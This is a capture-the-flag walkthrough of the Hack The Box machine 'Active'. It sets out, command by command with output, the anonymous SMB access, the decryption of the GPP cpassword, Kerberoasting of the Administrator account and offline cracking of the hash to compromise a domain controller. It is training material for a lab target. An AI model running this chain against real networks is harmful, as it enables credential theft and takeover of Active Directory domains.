---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: netexec smb nullsession gpp grouppolicypreferences cpassword gpp-decrypt kerberoasting GetUserSPNs.py
---

<br />

![1](../../../assets/images/Active/1.png)

<br />

OS -> Windows.

Difficulty -> Easy.

<br />

# Introduction:

<br />

Hello hackers! Today we’ll tackle the Active machine, an Easy level Windows box focused on SMB and Active Directory misconfigurations. We begin by exploiting a null session to access the Replication share, where we discover Group Policy Preferences storing encrypted credentials. After decrypting the cpassword, we gain access as a domain user and perform a Kerberoasting attack to retrieve and crack the Administrator's TGS ticket. With those credentials, we access the final flag. No shell needed—pure enumeration and offline attacks. Let’s dig in!

<br />

# Enumeration:

<br />

We begin with a standard `nmap` scan to identify open ports:

<br />

```bash
❯ nmap -p- 10.10.10.100 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-19 13:34 CEST
Nmap scan report for 10.10.10.100
Host is up (0.041s latency).
Not shown: 64862 closed tcp ports (reset), 650 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-19 11:33:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -37s
| smb2-time: 
|   date: 2025-06-19T11:34:54
|_  start_date: 2025-06-19T04:02:41
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.97 seconds
```

<br />

Relevant open ports:

- `Port 53` -> dns 

- `Port 88` -> kerberos

- `Port 135` -> rpc 

- `Port 139` -> netbios

- `Port 389` -> ldap 

- `Port 445` -> smb 

<br />

The domain active.htb across multiple `LDAP` ports, so we add it to our `/etc/hosts` file:

<br />

```bash
10.10.10.100 active.htb
```

<br />

# SMB Enumeration: -> Port 445

<br />

To begin enumerating this service, we're going to run this simple `netexec` oneliner:

<br />

```bash
❯ nxc smb active.htb
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
```

<br />

In the output we can verify the `active.htb` domain and that we're dealing with a 64-bit `Windows Server 2008 R2` system (build 7601).

Next, we use a null session to see which share resources we can list:

<br />

```bash
❯ nxc smb active.htb -u '' -p '' --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users                           
```

<br />

### Replication:

<br />

As we can see, there is an interesting and less commonly seen share named `Replication`.

We have read permissions on it, so we can log in with `smbclient`:

<br />

```bash
❯ smbclient //active.htb/Replication -U
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  active.htb                          D        0  Sat Jul 21 12:37:44 2018

		5217023 blocks of size 4096. 278072 blocks available
```

<br />

Inside, there is an `active.htb` directory with a lot of subdirectories and files.

To further enumerate its contents, we download everything to our local machine.

<br />

```bash
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0,7 KiloBytes/sec) (average 0,3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (16,9 KiloBytes/sec) (average 4,5 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (3,2 KiloBytes/sec) (average 4,2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (6,6 KiloBytes/sec) (average 4,6 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (22,4 KiloBytes/sec) (average 7,2 KiloBytes/sec)
```

<br />

If we list the folder structure with `tree`, it's easier to locate interesting files:

<br />

```bash
❯ tree active.htb
active.htb
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

22 directories, 7 files

```

<br />

The `groups.xml` immediately caught my attention:

<br />

```bash
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

<br />

It contains both a `userName` and a `cpassword` field.

<br />

## GPP Password Decrypt:

<br />

The `groups.xml` file is a typical artifact found in `GPP`. It is generated each time a new `Group Policy Preference` is created.

This file contains an encrypted credential in the `cpassword` field.

Where is the vulnerability?

The issue is that the key used to encrypt the `cpassword` was publicly disclosed. Although this vulnerability was patched in `MS14-025`, it does not prevent exploitation of previously created entries.

For a deeper understanding of this attack, refer to [this post](https://n1chr0x.medium.com/unwrapping-gpp-exposing-the-cpassword-attack-vector-using-active-htb-machine-4d3b97e0ac43)

<br />

### gpp-decrypt:

<br />

The most commonly used tool to decrypt the `cpassword` is `gpp-decrypt`, written in Ruby.

We can run it with the following command:

<br />

```bash
❯ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

<br />

Next, we verify the credentials using `netexec`:

<br />

```bash
❯ netexec smb active.htb -u "svc_tgs" -p "GPPstillStandingStrong2k18"
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
```

<br />

The credentials are valid. Let's enumerate the available shares for `svc_tgs`:

<br />

```bash
❯ netexec smb active.htb -u "svc_tgs" -p "GPPstillStandingStrong2k18" --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ    
```

<br />

We have read access to the `Users` share:

We can access this share using `smbclient`:

<br />

```bash
❯ smbclient //active.htb/Users -U "svc_tgs"
Password for [WORKGROUP\svc_tgs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 16:39:20 2018
  ..                                 DR        0  Sat Jul 21 16:39:20 2018
  Administrator                       D        0  Mon Jul 16 12:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 07:06:44 2009
  Default                           DHR        0  Tue Jul 14 08:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 07:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009
  Public                             DR        0  Tue Jul 14 06:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018

		5217023 blocks of size 4096. 277800 blocks available
```

<br />

We then retrieve the `user.txt` flag from the `svc_tgs` desktop:

<br />

```bash
smb: \svc_tgs\Desktop\> get user.txt
getting file \svc_tgs\Desktop\user.txt of size 34 as user.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
smb: \svc_tgs\Desktop\> 
```

```bash
❯ /usr/bin/cat user.txt
9dbbbca02bf0ac20bbe7cb0257xxxxxx
```

<br />

## Kerberoasting Attack:

<br />

`Kerberoasting` is a post-exploitation technique in Windows environments that targets the `Kerberos` authentication protocol (port 88).

In this attack, an authenticated domain user requests a Kerberos ticket for a `Service Principal Name` (SPN). The retrieved Kerberos ticket is encrypted using a hash derived from the service account's password. Once the attacker retrieves this hash, it can be cracked offline using tools like Hashcat or John the Ripper.

In most scenarios, you will need a valid account to perform a `Kerberoasting Attack`, however, if the `DC` is configured with the `UserAccountControl` flag set to `Do not require Kerberos pre-authentication`, it may be possible to request a valid ticket without valid domain credentials.

<br />

### Extracting the hash:

<br />

We can now perform the attack using the well-known `GetUsersSPNs.py` script from Impacket:

<br />

```bash
❯ GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-06-19 06:03:59.624172             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5249c079501d61c5df8b1cae5ca6cd8b$8fc61dd72d6f48d96d8e52bbcb25932c46f92fc02a2da0969275c57e6b3d3256c886899c53906d9a068100922c42fc767f81bf28b2a2ff7446c623abb718045e815358826bcab7d89a2541c0e4ba7b340ff8fc864c4ea0c7cc8720dec669f5daa38f25dbcccaecbb6a450cda34e582696c262585db387134a30ef62ed470a69149ea90c1ca92da8c5a5878f7b98d8238898853eea51025d47525a6fa22a8f6fe49847593b0ac8380ddcab6ea62c426f064a93271d97b8dacb2502f5973e977b15c076775657bccde30f29798b76d87a398d0e4d7f9f0403b86940eadad33bad3bae4821e32beccaa38c07d38edf9a6769bacd32bd25bc198da61c61f008d4a7af546810f995e7f1007dda7726234c93e3d955438a7c29194f2b3449f048ab6b592a1012b2c546873ce26f9d2748eab5ca33fed5cce704a3451364eabb20721070617963fd2b28a386c0b26bca75180a14556d764faefada6d725ada3b31c9bf4dd287cecccd397388a2239eea9b1ea25e493d90afc28abe07ec20e47222f44ab6bb859b3aaad6c86cf537b8ce8bc21a388fc8770d38d64f041cb8b36678a4a34c421210857b791fee4604557bbc3608a362aa9f148f9746e839882fbd6672f4454f602fe24636ac897f004f8b13a28092445c31a85a754480931e0bb76bd664ebc0b2c9de5b58f9847b81dfcad1d640ac1a8b852fbbb60655e3767e2e60178d49f60dd0971d53a9b67c6ebbebb6bf8a35011fdb33c1d1b2b3ab2f432ca4c1ad49de83e1664de79717b3d80448c57886041575beb56f318a3445450f28e822c8bd182bad6a677cb6b30c6845424ebf4c139fbd574e59dcc4ad9b5132cac0aebc319370089addaecaeb82d6091bdb13d07025e59237b2980c466db5b651727567bf192c169b73e1452f1089a8885cbdf7ea20174f00838e28a8bcd7b4e8c0c4300148b6f05aca658922d33b0fb4b649a81561266602136a36a242bd6aaa799c0c0c2cdeb59a1f6e19a8f6100972ba9ab0821b1e6ce069cf6ade81c8c9e2a41a7c0e0147c0561e179f07436d26122fe720b8b5e6b036c7acabb2feb08b2e4cf9e170a010d2df5ad90a553b4733b752b40b84074aa9b354e4f8ca38977b781cda106e03828a0b97e8de9c8d3aa3c08f08e9a681192ff8f69cae64364c2c944d9d97f93f34c6dd3e63d3a5c118f29339ffbf9144cf902c130a8d00f7a952c01a8e00b102195762e3733e85010ce6c5dd57f0d7295d3ac23d07650b2da
```

<br />

Great! We have the hash of the Adminstrator account.

Now, we can crack it with `John`:

<br />

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:33 DONE (2025-06-19 21:47) 0.02963g/s 312359p/s 312359c/s 312359C/s Tiffani3..Theicon123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

<br />

To validate these credentials, we run `netexec`:

<br />

```bash
❯ netexec smb active.htb -u administrator -p Ticketmaster1968 --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.10.100    445    DC               C$              READ,WRITE      Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ,WRITE      Logon server share
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ,WRITE      Logon server share
SMB         10.10.10.100    445    DC               Users           READ            

```

<br />

We can connect to the `Users` share with `smbclient` and retrieve the `root.txt` flag:

<br />

```bash
❯ smbclient //active.htb/Users -U administrator
Password for [WORKGROUP\administrator]:
Try "help" to get a list of possible commands.
smb: \> get Administrator\Desktop\root.txt 
getting file \Administrator\Desktop\root.txt of size 34 as Administrator\Desktop\root.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
```

```bash
❯ /usr/bin/cat root.txt
5f18ce50900ba9c718a4a9c84bxxxxxx
```

<br />

One more Active Directory machine pwned!!

This was a rather unusual case, since the WinRM port (5985) was closed and we couldn't establish a remote shell connection to the system.

I hope you learned something and enjoyed the process.

Keep hacking!!❤️❤️

<br />
